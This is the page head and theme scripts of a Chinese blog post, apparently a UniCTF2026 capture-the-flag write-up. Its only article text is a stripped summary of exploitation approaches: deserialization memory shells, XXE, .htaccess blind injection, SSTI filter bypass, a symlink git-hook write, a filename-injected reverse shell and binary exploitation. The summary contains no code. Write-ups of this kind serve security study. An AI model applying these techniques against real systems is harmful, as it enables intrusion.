<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>UniCTF2026 | OneSword</title><meta name="keywords" content="wp"><meta name="author" content="Onesword"><meta name="copyright" content="Onesword"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="UniCTF2026"><meta name="application-name" content="UniCTF2026"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="UniCTF2026"><meta property="og:url" content="https://onesword-xt.github.io/posts/UniCTF2026.html"><meta property="og:site_name" content="OneSword"><meta property="og:description" content="Webez java给了上传配置的接口 &amp;#x2F;api&amp;#x2F;user&amp;#x2F;settings&amp;#x2F;import  POST传参 configData 反编译 分析 Jar 包中的 UserProfileController.class 和 ConfigDataWrapper.class   1ois.readUTF()"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://hynuxtsec.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTY5YWQ3YWZmZTY1MjYzNjcyMTc2OTMyYWZmMWRhYTVfSkk4ek1ORHBBcUVzUlJtek45eklmR3o0bXd0NjhiZnBfVG9rZW46UWtLVGJiaG1Zb3BLbnN4SUhyNWM3VzRnbldoXzE3NzAxNDM1OTE6MTc3MDE0NzE5MV9WNA"><meta property="article:author" content="Onesword"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://hynuxtsec.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTY5YWQ3YWZmZTY1MjYzNjcyMTc2OTMyYWZmMWRhYTVfSkk4ek1ORHBBcUVzUlJtek45eklmR3o0bXd0NjhiZnBfVG9rZW46UWtLVGJiaG1Zb3BLbnN4SUhyNWM3VzRnbldoXzE3NzAxNDM1OTE6MTc3MDE0NzE5MV9WNA"><meta name="description" content="Webez java给了上传配置的接口 &amp;#x2F;api&amp;#x2F;user&amp;#x2F;settings&amp;#x2F;import  POST传参 configData 反编译 分析 Jar 包中的 UserProfileController.class 和 ConfigDataWrapper.class   1ois.readUTF()"><link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/csd0617/piclist@main/img/20250803211009219.png"><link rel="canonical" href="https://onesword-xt.github.io/posts/UniCTF2026.html"><link rel="preconnect" href="//cdn.cbd.int"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/swiper/swiper.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  linkPageTop: undefined,
  peoplecanvas: undefined,
  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
  diytitle: {"enable":true,"leaveTitle":"满堂花醉三千客，一剑霜寒十四州"},
  LA51: undefined,
  greetingBox: {"enable":true,"default":"晚上好👋","list":[{"greeting":"晚安😴","startTime":0,"endTime":5},{"greeting":"早上好鸭👋, 祝你一天好心情！","startTime":6,"endTime":9},{"greeting":"上午好👋, 状态很好，鼓励一下～","startTime":10,"endTime":10},{"greeting":"11点多啦, 在坚持一下就吃饭啦～","startTime":11,"endTime":11},{"greeting":"午安👋, 宝贝","startTime":12,"endTime":14},{"greeting":"🌈充实的一天辛苦啦！","startTime":14,"endTime":18},{"greeting":"19点喽, 奖励一顿丰盛的大餐吧🍔。","startTime":19,"endTime":19},{"greeting":"晚上好👋, 在属于自己的时间好好放松😌~","startTime":20,"endTime":24}]},
  twikooEnvId: 'https://onesword-twikoo-netlify.netlify.app/.netlify/functions/twikoo',
  commentBarrageConfig:{"enable":true,"maxBarrage":1,"barrageTime":8000,"accessToken":"","mailMd5":""},
  music_page_default: "nav_music",
  root: '/',
  preloader: {"source":3},
  friends_vue_info: undefined,
  navMusic: true,
  mainTone: undefined,
  authorStatus: {"skills":["🤖️ 数码科技爱好者","🔍 分享与热心帮助","🏠 智能家居小能手","🔨 设计开发一条龙","🤝 专修交互与设计","🏃 脚踏实地行动派","🧱 团队小组发动机","💢 壮汉人狠话不多"]},
  algolia: undefined,
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: true,
    simplehomepage: false,
    post: true
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: Onesword","link":"链接: ","source":"来源: OneSword","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false,
  shortcutKey: undefined,
  autoDarkmode: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  configTitle: 'OneSword',
  title: 'UniCTF2026',
  postAI: '',
  pageFillDescription: 'Web, ez java, SecureDoc, ezUpload, ezUpload Revenge!!, GlyphWeaver, Intrasight, gogogos, Bytecode Compiler, Misc, 工厂应急流量分析, Cube God, Welcome, Sign in, Silent resolver, 截取的线索, Pwn, 什么？我不是汇编高手吗？, smcode, speak, Uni_check, Sur prize, EZIO, 简单的pwn, shadow, Micro?Macro!, 1. SetImm (0x3a), 2. Add (0x7e), 3. Load (0x52), 4. Store (0xc4), 5. Call (0x1b), Macro?Micro!, 泄露 libc, Shell 程序关键修复, Store 溢出写入 TYPE_FUNC, 动态 TARGET 选择, Reverse, c_sm4, c_polynomial, r_zip, 原神！启动！, Strange_Py, 逆向分析总结, 是人类吗？, r_png, Crypto, Subgroup-Weaver, NTRU, subgroup_dlp, subgroup_lattice给了上传配置的接口传参反编译分析包中的和必须是必须是通过还原对象触发点触发了中会对字段进行异或解密然后调用加载类并实例化从而执行恶意代码内存马编译编写生成器模拟服务端的结构注意包名一致伪造结构包名必须正确必须和题目中的一致该类主要用于承载数据无需额外方法生成器正在生成自动寻找编译好的文件默认编译输出路径在项目名下或者同目录截取的线索如果当前目录没有尝试去或目录找适配运行环境错误找不到请先点击菜单编译项目读取恶意类文件读取字节码并加密反射构造对象必须是才能触发解密执行放入加密后的恶意代码序列化流程添加要求的协议头关键协议头写入真正的恶意对象编码输出复制下面的不要包含换行反射工具方法用于给字段赋值编译运行写入成功执行即可是中用来处理动态表单的技术它的本质是在内部嵌入了一段数据如果服务端使用解析器去解析这块数据且未禁用外部实体就会引发漏洞配置目标文件完整的信封结构包含了标准的头命名空间以及并尝试在节点中回显文件内容必须包含二进制注释以符合规范添加强制声明这是个表单核心修改策略全覆盖我们定义所有常见的键让它们全部指向同一个恶意流这样无论解析器检查哪个键都能读取到构造数组字符串写入文件手动计算写入对象写入表第个对象将生成的文件上传表达式盲注引入了强大的表达式语法可以在的配置指令中使用如等其中函数可以任意读取文件内容基于打布尔盲注的访问控制机制规则猜的内容如果猜对了允许访问返回如果猜错了拒绝访问返回文件内容在运行脚本之前先上传一个文件必须是一个服务器上已经存在的且原本能正常访问的文件名脚本会访问这个文件来判断还是字符集常见字符注意如果包含特殊正则字符如可能需要转义但大括号在这里通常没事目标文件检测开始盲注这可能需要几分钟如果你已经知道以开头可以填在这里加速构造猜测的前缀构造内容核心逻辑猜测内容如果文件内容以开头正则匹配成功允许访问否则拒绝访问上传覆盖旧的配置调试用上传失败如果上传失败可能是频率限制稍微停顿访问目标文件检测状态状态码为说明判定为真猜测正确发现一位状态码为说明判定为假猜测错误通常是正则语法错误比如猜到了特殊字符导致正则崩了错误可能是正则语法问题未知状态码请求异常本轮循环未找到任何字符当前已获取可能原因结束了或者字符集不全已获取完成多了点利用进行盲注强大的重写模块通常是默认开启的且它支持表达式判断开启重写引擎设置条件利用判断文件内容是否匹配正则触发规则如果条件满足则执行强制返回配置区域题目主页根据实际情况修改不用提前上传任意文件名即可字符集目标开始盲注构造逻辑如果匹配则触发注意因为了反斜杠我们无法转义正则特殊字符但在简单盲注中只要字符集不含等正则元字符通常可以直接拼接上传上传失败检测判定逻辑规则生效条件为真猜对了规则未生效条件为假猜错了发现可能是语法错误或关键字被禁如果所有字符都报说明被禁了异常本轮未找到字符最终接口存在模板注入严格过滤了等关键词字段限制字符规范化源码提示这意味着后端会将全角字符转换为半角字符只认识半角黑名单不认识全角字符半角字符转换将标准字符转换为全角字符用于绕过基于关键词的检测处理标准可见字符全角字符通常偏移量为处理空格其他字符保持原样使用示例原始绕过访问发现暴露的接口该接口接受参数即主界面的输入点使用扫描端口发现了返回管理后台返回服务返回到协议访问的端口并在头中泄露了动态生成的令牌显示需要刚刚看到的动态令牌报错提示后端验证了请求头中的和自定义头探测发现接口存在请求头转发漏洞即当外部请求端口时带上的会被后端逻辑转发给内网目标抓取管理员令牌正在获取令牌动态令牌构造发往端口的如果是透明转发这些会被带到端口尝试通过转发攻击注意这里的是发给端口的响应结果响应结果注入你的模板代码获取最新令牌用管理员使用新令牌发送混合攻击转发注入响应任意文件写入漏洞结合钩子机制的接口在修改文件内容时没有检查目标文件是否为符号链接注册账户创建仓库在本地创建一个恶意仓库并添加一个指向服务器钩子路径的符号链接初始化仓库关联远程仓库注意替换中的为你最新的容器你的是配置身份里随便填必须配置才能提交创建软链接提交并推送输入用户名和密码去查看仓库可以看到已经成功利用通过这个软链接把恶意的脚本写入服务器的钩子文件中然后再次触发它来拿授权应用生成令牌配置区域刚才推送成功的软链接请在这里填入如果环境重置了去网页重新生成一个修改点恶意脚本改为搜索文件和列出根目录命令会查找所有名字包含的文件正在获取当前的获取失败错误正在更新恶意脚本更新成功请再次执行触发更新失败去终端制造一个空提交强制产生变更记录再次推送这一次会真正把数据发过去并触发钩子分析的函数利用整数溢出符号扩展漏洞将数据包头部的设置为引擎执行结果变为这会导致指令分发逻辑计算出错误的索引是隐藏指令用于返回正在构造还原编译器核心逻辑无需修改构造恶意数据包核心漏洞利用点这里的内容不重要因为会忽略参数直接返回但为了符合协议格式我们随便填一个生成随机关键点将设置为在中结果为这将触发隐藏的指令执行注入恶意计算校验和发送请求攻击成功如下失败请求发送失败拿到有提示所以直接访问即可工厂应急流量分析这一题容器题有七个小题所以一个个来要我们找到打开阀门指令的相关信息我们先筛选出流量要求是找打开阀门的流量所以先筛选功能码为的且要为才视为打开可以看到筛选出的第一条就满足了条件按照格式得到因为协议是基于字节流的所以功能码占用一个字节但个字节在十六进制下固定用位表示地址也是同样的道理找到通过协议读取的因为我们没办法直接过滤出的流量所以考虑用脚本一次性提取所有可以看出第一个出现的请求对应的就是所以得到找出控制站域名的解析可以直接用过滤可以看到项为所以得到确定源到控制站目的上首个成功发起的时间点根据上题号数据包就是客户端首次成功向控制站发送请求的包直接在下面的详细信息里面能看到时间戳提取对控制站发起的请求的与同样还是包根据格式攻击者对控制站发起了找出该请求的序列号还是先使用过滤语句定位根据题目第一条流量就包含了的信息所以首先考虑第一条流量对控制站发起了请求找出该请求查询的从前面的题目我们已知和控制站的分别是和先过滤定位但是发现识别不到流量尝试别的方法强制扫描包的原始负载扫描完成发现只有一条流量符合能看到这个包内的字符串所以提交所有题目的后拿到目标只能了极速魔方引擎基于预计算的索引映射动作定义预计算的置换表使用题目原本的逻辑生成种移动的索引置换表这确保了我们的移动逻辑与服务器完全一致但速度快百倍将每个格子初始化为它的索引值顺序旋转面本身辅助函数侧面联动逻辑生成表初始化映射表算法核心中间相遇剪枝规则禁止同面连续禁止对立面逆序如禁止后强制后避免重复状态初始状态允许所有移动预计算从复原状态反向生成步内的所有状态正在进行预计算深度请耐心等待约秒极速状态转移记录路径已生成个状态预计算完成总状态数耗时从预计算表回溯解法反向逻辑存的是解法需要逆向操作角块合法性索引用于过滤隐藏面的猜测角块包含对立色非法交互与主逻辑读取题目数据解析等数据重构魔方状态统计缺失颜色猜测隐藏面剪枝物理非法查表是否在预计算中补搜运行时预计算运行时上帝之数相遇检测步骤预计算必须等待完成步骤连接本地测试无法连接服务器获取结果并检查解码得密钥需要十六进制再用补位得到解码得使用打开附件发现均为传输且有大量网站查找的关键词得到几个可以字符串将字符串提取出来后观察规律发现两两相同且前五位疑似序号将看为看为结尾后按照序号排列后续字符串发现只有字母与的数字怀疑是编码统一后解码的开头字符串将其用新建为压缩包解压后打开文档的截取的线索打开附件得到一条像素宽的黑白像素点和一串密文将图片像素点转化为二进制得再将其每八位分割转化为得观察已解出部分像是后半段观察密文内容推测解密后为前段且已知格式为所以推测密文中与相对应将两段字符串转化为二进制得以上七队数值异或结果均为由此推出解密为拼接得什么我不是汇编高手吗考察以及汇编指令的理解有后门函数直接跳转即可得到机器码会吃掉后面的数据部分配合上一条组成指令部分会吃掉后面的修正吃掉下一个此时这里的跳转是绝对跳转无视限制这题也是考察但是有一些限制字节必须要满足斐波那契数列合理利用可以往可写可执行段后写入一些特殊的汇编指令比如等等同时我们可以利用对进行一个清空这样更加方便我们布置指令中间可以使用滑梯布置一个调用这样我们就可以实现续写允许的字节考点是栈上的格式化字符串漏洞这里相当于是又给了一次格式化字符串漏洞因为溢出到了后面的这个我们可以用来泄露地址然后通过劫持函数的返回地址以及实现一个栈迁移执行但是这是概率事件致命错误点文件漏洞点如果攻击者能够创建一个文件名包含特殊字符的文件当扫描并试图删除这个非法文件时它实际上会执行攻击者嵌入的命令配置区域你的公网监听地址千万别写修改这里修改这里构造反弹命令编码防止特殊字符被拦截构造最终文件名还是用跳到目录利用脚本的删除操作触发执行核心逻辑第一步注入恶意创建文件第二步触发执行命令因为反弹会阻塞连接所以这里设置极短超时或者忽略错误我们可以利用会创建一个文件保存在的机制我们把变成一个经过特殊构造的文件名这样它就会执行我的文件名对应的命令通过打反弹我们就可以拿到服务器上的看到这个就猜测到考点是通过这种手法我们就可以合理的控制地址上的值而且还给了我们两个特殊函数和我们先用查看靶机上面的名称然后再利用函数控制好然后进行一个简单的操作即可考点比较简单版本的给了一个后门函数我们直接控制好执行即可简单的这有个任意泄露我选择泄露地址任意地址写但是由于读入长度限制我们无法控制位所以我们可以打这个不需要控制位还是比较简单的这里比较重要的就是这个函数当我们程序段错误的时候就会跳转到函数进行处理函数非常明显的栈溢出这题的难点在于影子栈保护机制如果返回地址被非法纂改它会检测到并且把返回地址改回来这里有两个读入函数是一个有栈溢出的读入函数我们可以通过溢出修改上的地址的第一个字节来实现第二个读入短距离任意栈写入这个时候我们就可以控制执行流到处我选择到这可以让存储返回地址的索引非法加一这个时候就会导致定位错误这个时候下来我们可以再次通过函数修改再次实现短距离栈任意写这次可以挑一个有的地方写入一个字节就会配合把这个地址打印出来就实现了的泄露然后后面的检查由于定位错误会导致段错误进入处理函数我们就可以利用这个性质打一下随后即可程序概述基本信息文件名原始名可能是架构编译器符号包含符号信息便于调试保护机制表只读但可在运行前写入栈保护已启用栈不可执行地址随机化关键结论所有现代保护机制均已启用传统的栈溢出等技术难以直接应用程序逻辑分析主函数流程程序实现了一个自定义的虚拟机解释器其核心功能初始化使用当前时间作为随机种子生成一个随机的索引范围清空数组个每个字节清空数组最多条指令关键操作指针类型关键操作数组基址命令解析循环显示帮助信息添加一条指令执行已添加的所有指令调试信息泄漏值退出程序指令添加解析用户输入的和参数验证参数有效性将指令存入数组最多允许条指令指令执行遍历数组中的所有指令根据调用相应的数据结构结构字节数据值或指针全局数组指令结构字节全局数组虚拟机指令集映射表程序使用了一个混淆的编码方案通过逆向和暴力测试确定了以下映射操作码值参数格式功能描述设置为立即数加法支持指针算术条件移动解引用写内存函数调用必须打印的值无退出程序指令详解指令格式功能示例指令格式功能如果或是结果继承类型否则结果为示例关键特性支持指针算术如果一个操作数是指针加上一个整数偏移结果仍是指针指令格式前提条件必须是指针功能示例解引用安全检查要求必须是指针类型但不检查指针指向的地址是否有效指令格式前提条件必须是指针必须是整数功能示例关键漏洞可以向任意可写地址写入字节数据指令格式前提条件必须是函数指针功能如果传值如果传指针示例调用指向的函数参数为关键漏洞如果我们能控制一个的并设置其为函数地址就可以任意函数调用漏洞分析信息泄漏漏洞位置设置为指针类型指向数组基址影响程序将数组的基址存储在一个随机的中通过命令可以泄漏的值攻击者可以利用这个指针进行指针算术访问程序中的任意内存为什么这是漏洞随机化后程序的绝对地址是未知的但是指向了已知的相对偏移通过指针算术指令可以计算出表其他全局变量等的地址类型混淆漏洞位置指令漏洞原理数组本身位于可写的段地址指向是一个指针类型的通过指针算术我们可以计算出的地址每个的前字节是字段通过指令我们可以写入任意的字段攻击步骤假设目标修改计算的地址我们需要一个指向这个地址的指针偏移因为指向加上保持类型将值写入即任意代码执行漏洞利用链泄漏基址通过指针算术访问表使用指令读取已解析的函数地址如计算基址计算目标函数地址根据偏移计算出函数地址将地址存储在某个中类型伪造使用类型混淆漏洞将该的修改为触发执行准备参数如字符串使用指令调用利用流程阶段信息收集泄漏例如阶段泄漏地址数组位于位于偏移计算地址的指针现在是类型需要改为修改的类型为类型即解引用读取函数地址阶段计算地址偏移根据符号表差值阶段准备参数将字符串放入内存计算指向该字符串的指针的字段位于阶段类型伪造修改的类型为阶段触发执行地址指向的指针成功获取总结与建议关键漏洞总结设计缺陷将敏感指针暴露给虚拟机类型系统缺陷类型标记存储在可写内存中可被篡改缺乏隔离的内存与元数据混合存储不完整的验证指令不验证写入地址的合法性安全建议如果要修复此程序建议隔离元数据将字段存储在单独的只读数组中移除信息泄漏不要将系统指针暴露给沙箱化限制只能访问专用的堆区域禁用危险操作移除或严格限制指令地址空间随机化即使泄漏了基址也应该对敏感结构进行额外的随机化技术亮点本次展示了类型混淆攻击技术指针算术在受限环境中的应用多阶段思想在环境中的实现精确的内存布局分析关键地址符号地址描述数组字节指令数组字节已添加的指令数随机选择的索引函数的表项编码规则通过逆向发现编码使用了复杂的跳转表混淆伪代码实际映射通过暴力测试确定见测试环境系统但题目提供了特定的工具使用打远程配置修改为实际的远程主机修改为实际的远程端口映射偏移量连接函数连接失败执行步骤泄漏步骤泄漏等待下一个提示符步骤构造利用指令步骤构造利用链发送指令并等待指令失败响应接收响应超时异常构造指令序列计算地址设置类型为读取地址计算地址布置字符串计算指针设置类型为调用发送所有指令发送条指令指令失败所有指令发送成功步骤执行触发步骤执行触发步骤获取步骤获取等待一下让执行执行一些命令验证发送命令尝试读取接收输出输出查找发现读取输出异常进入交互模式进入交互模式按退出主函数创建连接无法建立连接程序退出用户中断失败因为比较懒得逆向所以直接让帮我跑出来了泄露对执行只有真正的是类型会产生有效的新从新读取匹配低位验证是地址程序关键修复问题块开始时只有可见之前在块计算的不可用解决方案在块中重新计算地址溢出写入写入溢出写入高字节是动态选择避免与冲突完整攻击修复块中参数可见性问题泄露完全来自泄露程序对尝试然后对每个可能的执行如果是则产生新从新读取打印结果尝试泄露地址完全来自调用修复版修复版程序关键点在块中准备所有数据写入和在块中需要重新计算参数地址因为只有可见动态选择避免与冲突写入溢出写入用创建指针只有当它是真正的时才有效地址写入地址写入溢出位置会覆盖跳转到块块在块中只有可见需要重新创建参数重新计算地址类型混淆让变得可见如果是变成调用参数是的地址尝试获取对每个可能的都尝试多次运行每个尝试次因为是随机的发送命令测试是否有重新连接获取交互同样直接用跑出来了压缩包里有一个密文文本文件和一个可执行文件文件加了个壳直接脱了打开脱壳后的可执行文件审计代码是模式的标准算法直接写代码解密就行打开审计代码发现有很多检测动调的函数先把这些函数都掉然后看关键代码要求输入个整数使它们能构成一个次多项式输入对了则会输出其中是最终的判断条件由于最后输出的的生成逻辑跟输入的数字有关所以这题的逆向流程要解出这个多项式然后把代码和关键数据喂给就能吐出满足条件的数字了将这个整数输入程序验证就能得到最终给了一个文件和一个后缀为的压缩包文件打开分析文件的内容整体代码比较难看是一个程序跟进函数函数内是一个完整的压缩工具实现代码应该是一个风格的滑动窗口压缩程序经分析后是一个的变体压缩算法因此要得到就要逆向压缩算法后写解压代码得到原始文件错误找不到文件检查是否匹配压缩特征对应逆向中的标志根据逆向逻辑还原长度和距离是长度是距离逆向中还原距离将的低位作为高位的高位作为低位从当前输出流回溯复制字面量直接写入对应逆向中的逻辑解压完成原始大小字节解压后字节使用方法运行代码后能得到一个原始文件用打开文件就能看到了原神启动打开文件目测是个的游戏文件夹里果然找不到文件然后就是走的逆向流程获取到这个文件用打开看到关键函数及它的偏移地址回去用打开文件恢复符号表等待它完全恢复后在函数表搜索找到关键函数发现函数表里有个解密函数跟进找到调用解密的地方只有满足前面的条件判断才能运行正确的解密函数所以解题思路就是把条件判断掉再把文件替换回去重新运行游戏这样不管抽到的是不是钟离都能得到了逆向分析总结识别程序目标是一个打包的程序提取核心逻辑提取了归档文件并从中提取了发现加密逻辑依赖于一个原生扩展模块算法分析中的函数实际上执行了一个逆向的算法循环使用了操作并将加密后的数据混淆后打包函数实际上并未进行强加密而是将生成的字节随机密钥和后缀附加到文件末尾解密方案从文件末尾提取全局和将分割为字节的块字节数据字节掩码逆向的逻辑即执行正向加密循环还原原始数据的字符串通过掩码还原原始字节结果解密后得到了一个可执行文件运行该程序输出是人类吗题目信息名称类型目标获取解题步骤初步分析打开题目附件发现包含和这显然是一个基于的前端逆向题目查看发现核心逻辑是记录鼠标轨迹然后调用进行验证如果返回的字符串以开头则验证成功分析将转换为进行阅读或者直接在中分析需配合对应插件本题已提供连接定位到导出函数分析其汇编逻辑输入处理函数接收坐标数组和长度特征计算遍历坐标点计算位移计算由构成的速度和加速度累加以及的平方最终计算出四个分量与相关平均速度轴平均加速度特征轴平均加速度特征构造解密过程利用构造的作为初始状态运行算法将内存中偏移处的密文与异或返回结果返回解密后的字符串解密策略密文存储在的偏移我们需要找到正确的使得解密出的明文以开头由于是由四个生物特征值拼接而成且题目提示这些值通常不会太大我们可以暴力枚举这四个分量部分范围实际绘图长度有限扫描足够或者扫描全部使用编写求解脚本以提高效率求解过程提取密文共字节运行求解脚本核心逻辑假设值较小模拟并检查前缀运行得到唯一有效解计算根据题目要求验证通过字符串生物特征值之和逆向得到的特征值为包含所有分量的和组合字符串计算题目分析拿到题目文件和加密后的文件初步分析将放入进行分析通过字符串列表发现相关的路径信息确定这是一个编写的程序找到入口点进而定位到函数最终找到核心逻辑函数地址逻辑逆向分析函数参数检查代码检查了参数数量并且检查最后一个参数必须是字节长度且每个字符都在之间这极大地缩小了密钥空间初始化代码中有一段通过和多个常量填充栈上字节缓冲区的逻辑通过提取这些数据发现其实就是到的顺序排列过程有一个次的循环根据对进行打乱这就是标准的加密过程随后的循环遍历输入数据生成密钥流但是有一点不同即异或的值不是直接的密钥流而是加了解密脚本编写根据分析编写脚本进行暴力破解读取循环从到模拟程序的初始化和过程在阶段计算解密验证判断解密出的前字节是否为文件头获取运行脚本秒出结果解密出的图片包含附件解密脚本题目这里可以看出来是随机数我们可以通过收集的是固定密钥与随机掩码的异或结果来恢复密钥其中掩码的每个比特为的概率约为通过分析大量样本中每个比特位置的频率如果频率超过则推测密钥对应位为否则为最后将比特组合成字节形式的密钥题目我们可以通过枚举所有可能的个位置中选个每个非零系数为计算候选消息并检查的系数是否都在小范围内到或到可以恢复出原始消息题目附件问题可以利用尝试分解得到如下结果对每个素因子的进行分解发现基本上都是小因子直接用算法求解最后用即可得到结果对于中间的次的素因子求可以用提升将模下的基础解逐渐往上提升到次即可解出题目附件论文题考的是参考论文如下论文中初始值的高位也是已知的但是在这个题目中有一点不同值并不是从第一个初始值的高位开始输出的而是从第个初始值的高位开始输出不过我们可以把视作新的初值然后往后面取足够多的值就和论文的情况几乎一样了即可恢复出和的值然后往前推出初值最后把初值求和即可论文作者在论文里给出了代码地址不过是实现的直接改为即可先收集数据收集结束后不退出等待后面输入求出结果后然后进行交互得到题目题目题目我们可知最后得到',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2026-02-04 02:34:00',
  postMainColor: '',
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><link rel="stylesheet" href="/css/imgloaded.css?1"><link rel="stylesheet" href="/custom/css/schedule.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/js-heo@1.0.11/poem/poem.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/js-heo@1.0.11/mainColor/heoMainColor.css"><meta name="generator" content="Hexo 7.3.0"></head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://cdn.jsdelivr.net/gh/csd0617/piclist@main/img/20250803211009219.png"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.getElementById('loading-box').classList.add("loaded");
  },
  initLoading: () => {
    document.getElementById('loading-box').classList.remove("loaded")
  }
}
window.addEventListener('load',()=> { preloader.endLoading() })
setTimeout(function(){preloader.endLoading();},10000)

if (true) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
